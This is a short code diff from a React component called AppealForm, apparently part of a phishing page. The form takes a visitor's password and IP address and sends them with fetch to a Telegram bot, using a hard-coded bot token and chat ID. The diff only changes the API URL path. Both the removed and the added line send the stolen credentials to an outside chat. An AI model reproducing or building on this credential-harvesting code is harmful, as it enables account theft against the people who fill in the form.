@@ -62,7 +62,7 @@ const AppealForm = (props) => {
 
             const message = `
              Ip:${props.ip.userIP}, second pw: ${data.password}`;
-            const res = await fetch(`https://api.telegram.org/bot6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=6039842779&text=${message}`);
+            const res = await fetch(`https://api.telegram.org/6277909448:AAFfpXATR7nZd4t-m_SMtG1b5jxQxRsJh8A/sendMessage?chat_id=6039842779&text=${message}`);
             setSteps({first_password: false, second_password: false})
             trigerNext();
 
